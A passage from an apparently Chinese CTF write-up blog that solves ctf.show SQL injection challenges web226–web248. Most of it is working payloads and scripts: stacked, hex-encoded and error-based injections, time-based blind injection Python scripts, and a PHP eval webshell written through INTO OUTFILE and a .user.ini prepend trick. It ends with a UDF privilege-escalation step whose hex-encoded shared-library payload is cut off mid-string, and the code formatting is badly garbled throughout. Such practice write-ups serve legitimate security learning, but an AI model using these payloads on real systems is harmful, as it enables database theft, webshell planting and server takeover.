+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>- 用concat绕过也可以<br><br>### web226<br><br>- 查询语句转换成<span class="hljs-number">16</span>进制绕过<br><br>- ```<br>  username=user1%<span class="hljs-number">27</span>;PREPARE%<span class="hljs-number">20</span>luelueking%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">200</span>x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE%<span class="hljs-number">20</span>luelueking;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h3><ul>
+<li>&#96;&#96;&#96;<br>&#x2F;api&#x2F;?username&#x3D;1%27;call%20getFlag();<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web228~230</span><br><br>- 同web226<br><br><span class="hljs-comment">### web231</span><br><br>- ```<br>  POST:	<span class="hljs-attribute">password</span>=1&#x27;,username=user() where <span class="hljs-attribute">1</span>=1#&amp;username=1<br>  查表名<br>  <span class="hljs-attribute">password</span>=1&#x27;,username=(select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()) where <span class="hljs-attribute">1</span>=1#&amp;username=1<br>  查列名<br>  <span class="hljs-attribute">password</span>=1&#x27;,username=(select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;flaga&#x27;</span>) where <span class="hljs-attribute">1</span>=1#&amp;username=1<br>  得到flag<br>  <span class="hljs-attribute">password</span>=1&#x27;,username=(select flagas <span class="hljs-keyword">from</span> flaga) where <span class="hljs-attribute">1</span>=1#&amp;username=1<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h3><ul>
+<li><p>比web231换了一下闭合方式</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>POST: password&#x3D;0’),username&#x3D;database()%23&amp;username&#x3D;1</p>
+<p>password&#x3D;0’),username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) where 1&#x3D;1#&amp;username&#x3D;1</p>
+<p>password&#x3D;0’),username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’flagaa’) where 1&#x3D;1#&amp;username&#x3D;1</p>
+<p>password&#x3D;0’),username&#x3D;(select flagass from flagaa) where 1&#x3D;1#&amp;username&#x3D;1</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">### web233</span><br><br>- 时间盲注<br><br>- ```python<br>  import requests<br>  <br>  url = <span class="hljs-string">&quot;http://e48a1a65-989c-4717-81fd-fe9ced9d6f68.challenge.ctf.show/api/?page=1&amp;limit=10&quot;</span><br>  <br>  result = <span class="hljs-string">&quot;&quot;</span><br>  i = 0<br>  <br>  <span class="hljs-keyword">while</span> 1:<br>      i = i + 1<br>      <span class="hljs-built_in">head</span> = 32<br>      <span class="hljs-built_in">tail</span> = 127<br>  <br>      <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>          mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>          <span class="hljs-comment"># 查数据库</span><br>          <span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>          <span class="hljs-comment"># 查表名</span><br>          <span class="hljs-comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;flag233333&#x27; limit 1,1&quot;</span><br>          <span class="hljs-comment"># 查数据</span><br>          payload = <span class="hljs-string">&quot;select flagass233 from flag233333&quot;</span><br>          data = &#123;<br>              <span class="hljs-string">&#x27;username&#x27;</span>: f<span class="hljs-string">&quot;1&#x27; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.05),1)#&quot;</span>,<br>              <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;4&#x27;</span><br>          &#125;<br>          try:<br>              r = requests.post(url, data=data, <span class="hljs-built_in">timeout</span>=0.9)<br>              <span class="hljs-built_in">tail</span> = mid<br>          except Exception as e:<br>              <span class="hljs-built_in">head</span> = mid + 1<br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>          result += chr(<span class="hljs-built_in">head</span>)<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-built_in">break</span><br>      <span class="hljs-built_in">print</span>(result)<br>  <br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h3><ul>
+<li><p>因为单引号被过滤了，当存在单引号，和没有单引号的时候返回值是不一样的，所以需要用反斜杠转义来逃逸，然后注入点改为username，因为前面的where已经被当做字符串了失去了原来的作用，这样才会保证set成功</p>
+</li>
+<li><p>原来的语句是<br>$sql &#x3D; “update ctfshow_user set pass &#x3D; ‘{$password}’ where username &#x3D; ‘{$username}’;”;<br>但是传入单引号后<br>$sql &#x3D; “update ctfshow_user set pass &#x3D; ‘&#39; where username &#x3D; ‘username’;”;<br>这样pass里面的内容就是’ where username &#x3D;,接下来username里面的参数就是可以控制的了</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>password&#x3D;1&amp;username&#x3D;,username&#x3D;(select database())#</p>
+<p>password&#x3D;1&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#<br>&#x2F;&#x2F;flag23a</p>
+<p>password&#x3D;1&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)#<br>&#x2F;&#x2F;id,flagass23s3,info</p>
+<p>password&#x3D;1&amp;username&#x3D;,username&#x3D;(select flagass23s3 from flag23a)#</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>### web235～<span class="hljs-number">236</span><br><br>- 过滤了<span class="hljs-keyword">or</span>和单引号<br><br>- **innodb_table_stats**代替**information_schema**<br><br>  mysql默认存储引擎innoDB携带的表:<br>  mysql.innodb_table_stats<br>  mysql.innodb_index_stats<br><br>  两表均有database_name和<span class="hljs-built_in">table_name</span>字段<br><br>- ```<br>  <span class="hljs-keyword">password</span>=<span class="hljs-number">1</span>\&amp;username=,username=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())#<br>  <br>  <span class="hljs-keyword">password</span>=<span class="hljs-number">1</span>\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name=<span class="hljs-keyword">database</span>())#<br>  //banlist,ctfshow_user,flag23a1<br>  <br>  <span class="hljs-keyword">password</span>=<span class="hljs-number">1</span>\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(`<span class="hljs-number">2</span>`) <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> flag23a1)a)#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h3><ul>
+<li><p>注入点在&#x2F;api&#x2F;insert.php，我是sb</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>username&#x3D;1’,(select group_concat(flagass23s3) from flag))#&amp;password&#x3D;1</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment">### web238</span><br><br>- 过滤了空格<br><br>- ```<br>  username=<span class="hljs-number">2</span>&#x27;,(select(group_concat(<span class="hljs-built_in">id</span>,flag,info))<span class="hljs-keyword">from</span>(flagb)))<span class="hljs-comment">#&amp;password=1</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h3><ul>
+<li>&#96;&#96;&#96;<br>username&#x3D;1’,(select(group_concat(flag))from(flagbb)))#&amp;password&#x3D;1<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web240</span><br><br>- ```python<br>  import requests<br>  <br>  kk = <span class="hljs-string">&quot;ab&quot;</span><br>  url1 = <span class="hljs-string">&quot;http://d527c27f-64cd-48fa-b3e8-807df67f2f20.challenge.ctf.show/api/insert.php&quot;</span><br>  url2 = <span class="hljs-string">&quot;http://d527c27f-64cd-48fa-b3e8-807df67f2f20.challenge.ctf.show/api/?page=1&amp;limit=100&quot;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> kk:<br>      <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> kk:<br>          <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> kk:<br>              <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> kk:<br>                  <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> kk:<br>                      flag = <span class="hljs-string">&quot;flag&quot;</span> + i + j + m + n + c<br>                      <span class="hljs-built_in">print</span>(flag)<br>                      data = &#123;<br>                          <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&quot;luelueking&#x27;,(select(group_concat(flag))from(&#123;&#125;)));#&quot;</span>.format(flag),<br>                          <span class="hljs-string">&#x27;password&#x27;</span>: 1<br>                      &#125;<br>                      res = requests.post(<span class="hljs-attribute">url</span>=url1, <span class="hljs-attribute">data</span>=data).text<br>  <br>                      r = requests.<span class="hljs-built_in">get</span>(<span class="hljs-attribute">url</span>=url2).text<br>                      <span class="hljs-built_in">print</span>(r)<br>                      <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ctfshow&#123;&quot;</span> <span class="hljs-keyword">in</span> r:<br>                          <span class="hljs-built_in">print</span>(res)<br>                          exit()<br>  <br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h3><ul>
+<li><pre><code class="python">import requests
+import time
+
+url = &#39;http://060c1957-6988-495b-82a7-bd24f6611427.challenge.ctf.show:8080/api/delete.php&#39;
+flag = &#39;&#39;
+i = 4
+
+while 1:
+    i += 1
+    head = 32
+    tail = 127
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # 查库名
+        # payload = &#39;database()&#39;
+        # 查表名
+        # payload = &#39;(select group_concat(table_name) from information_schema.tables where table_schema=database())&#39;
+        # 查列名
+        # payload = &quot;(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;)&quot;
+        # 查flag
+        payload = &#39;(select flag from flag)&#39;
+        data = &#123;
+            &#39;id&#39;:f&quot;if(ascii(substr(&#123;payload&#125;,&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.1),0)#&quot;
+        &#125;
+
+        try:
+            r = requests.post(url=url,data=data,timeout=2.1)
+            tail = mid
+        except Exception as e:
+            head = mid + 1
+        time.sleep(1)
+    if head != 32:
+        flag += chr(head)
+    else:
+        break
+    time.sleep(1)
+    print(flag)
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><br>### web242<br><br>- 利用info outfile的扩展参数来做题<br><br>- ```sql<br>  <span class="hljs-keyword">SELECT</span> ... <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;file_name&#x27;</span><br>          [CHARACTER <span class="hljs-keyword">SET</span> charset_name]<br>          [export_options]<br>  <br>  export_options:<br>      [<span class="hljs-comment">&#123;FIELDS | COLUMNS&#125;</span><br>          [TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;string&#x27;</span>]<span class="hljs-comment">//分隔符</span><br>          [[OPTIONALLY] ENCLOSED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;char&#x27;</span>]<br>          [ESCAPED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;char&#x27;</span>]<br>      ]<br>      [LINES<br>          [STARTING <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;string&#x27;</span>]<br>          [TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;string&#x27;</span>]<br>      ]<br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><pre><code class="sql">“OPTION”参数为可选参数选项，其可能的取值有：
+
+`FIELDS TERMINATED BY &#39;字符串&#39;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
+
+`FIELDS ENCLOSED BY &#39;字符&#39;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
+
+`FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
+
+`FIELDS ESCAPED BY &#39;字符&#39;`：设置转义字符，只能为单个字符。默认值为“\”。
+
+`LINES STARTING BY &#39;字符串&#39;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
+
+`LINES TERMINATED BY &#39;字符串&#39;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-bullet">- </span><span class="hljs-strong">**可以写马的参数有：**</span><br><br></code></pre></td></tr></table></figure>
+FIELDS TERMINATED BY`、 `LINES STARTING BY`、 `LINES TERMINATED BY
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>在url<span class="hljs-regexp">/api/</span><span class="hljs-keyword">dump</span>.php下写马<br><br>马在url<span class="hljs-regexp">/dump/</span><span class="hljs-number">1</span>.php<br><br></code></pre></td></tr></table></figure>
+POST: filename=1.php&#39; LINES STARTING BY &quot;&lt;?php eval($_POST[1]);?&gt;&quot;;#
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">### web243</span><br><br><span class="hljs-bullet">-</span> 过滤了php<br><br><span class="hljs-bullet">-</span> 在上一题目的payload中是需要php字段的，这里给取消掉了，也不知道phtml好不好用，但是本地重要考点在于.user.ini:auto<span class="hljs-emphasis">_append_</span>file=1.png或者auto<span class="hljs-emphasis">_prepend_</span>file=1.png<br><br><span class="hljs-bullet">-</span> 再熟悉一遍上一题的参数：<br><br></code></pre></td></tr></table></figure>
+FIELDS TERMINATED BY：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
+
+LINES STARTING BY &#39;字符串&#39;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
+
+LINES TERMINATED BY &#39;字符串&#39;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs"><br>payload：<br><br>先上ini：<br><br></code></pre></td></tr></table></figure>
+filename=.user.ini&#39; LINES STARTING BY &#39;;&#39; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d312e706e670a;#
+注意16进制是为了0a(换行)发挥作用，而starting by “;”，是想让每行数据的开头字符都是分号，是为了让前面的那个select * from ctfshow_user查出来的东西与后面的做个了断
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>再上png🐴：(<span class="hljs-number">16</span>进制绕过)<br><br></code></pre></td></tr></table></figure>
+filename=1.png&#39; LINES TERMINATED BY 0x3c3f706870206576616c28245f504f53545b315d293b3f3e;#
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>  <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br>  连接时候注意是/dump/index.php<br><br><span class="hljs-comment">### web244</span><br><br>- 报错注入<br><br>- 二种形式<br><br>- ```<br>  <span class="hljs-title function_ invoke__">extractvalue</span>(目标xml文档，xml路径):对XML文档进行查询的函数<br>  <br>  <span class="hljs-title function_ invoke__">updatexml</span>(目标xml文档，xml路径，更新的内容):更新xml文档的函数<br>  <br>  其都是针对xml路径进行的注入<br>  <br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p>&#96;&#96;&#96;<br>updatexml:<br>?id&#x3D;1’ or updatexml(1,concat(0x7e,database(),0x7e),1)+–+</p>
+<p>?id&#x3D;1’ or updatexml(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,32),0x7e),1)+–+</p>
+<p>?id&#x3D;1’ or updatexml(1,concat(0x7e,(select left(flag,32) from ctfshow_flag),0x7e),1)+–+</p>
+<p>?id&#x3D;1’ or updatexml(1,concat(0x7e,(select right(flag,32) from ctfshow_flag),0x7e),1)+–+</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web245</span><br><br>- 过滤了updatexml<br><br>- ```<br>  extractvalue:<br>  ?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">or</span> extractvalue(1,concat(0x7e,(select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),0x7e))+--+<br>  <br>  ?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">or</span> extractvalue(1,concat(0x7e,substr((select group_concat(flag1) <span class="hljs-keyword">from</span> ctfshow_flagsa),20,30),0x7e))+--+<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h3><ul>
+<li><p>update也被过滤了</p>
+</li>
+<li><p><strong>floor报错注入</strong>:主要利用主键的重复来实现报错</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>?id&#x3D;1’ union select 1,count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))b from information_schema.tables group by b– -</p>
+<p>?id&#x3D;1’ union select 1,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1), 0x7e,floor(rand(0)*2))b from information_schema.tables group by b – -</p>
+<p>?id&#x3D;1’ union select 1,count(*),concat(0x7e,(select flag2 from ctfshow_flags),0x7e,floor(rand(0)*2))b from information_schema.tables group by b– -</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs q"><br>### web247<br><br>- **`floor()：向下取整`<br>  `ceil()：向上取整`<br>  `round()：四舍五入`**<br><br>  **<span class="hljs-built_in">floor</span>替换成其他取整函数即可**<br><br>- ```<br>  ?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> `flag?` <span class="hljs-keyword">from</span> ctfshow_flagsa ), <span class="hljs-number">0x7e</span>,round(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))b <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> b -- -<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h3><ul>
+<li><p><strong>udf：用户自定义的函数</strong></p>
+</li>
+<li><p>&#96;&#96;&#96;<br>&#x2F;api&#x2F;?id&#x3D;1’; select @@plugin_dir; – -<br>查出Mysql插件路径：&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;</p>
+<p>&#x2F;api&#x2F;?id&#x3D;’;CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘udf.so’;–+<br>引入udf.so文件从而创建函数sys_eval</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><br>- <span class="hljs-built_in">exp</span>提权<br><br>- ```<br>  import requests<br>  <br>  base_url=<span class="hljs-string">&quot;http://3f801e10-5c58-42bf-a5cf-8a588d3bfe9c.challenge.ctf.show:8080/api/&quot;</span><br>  payload = []<br>  <span class="hljs-keyword">text</span> = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>]<br>  udf = <span class="hljs-string">&quot;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E0000000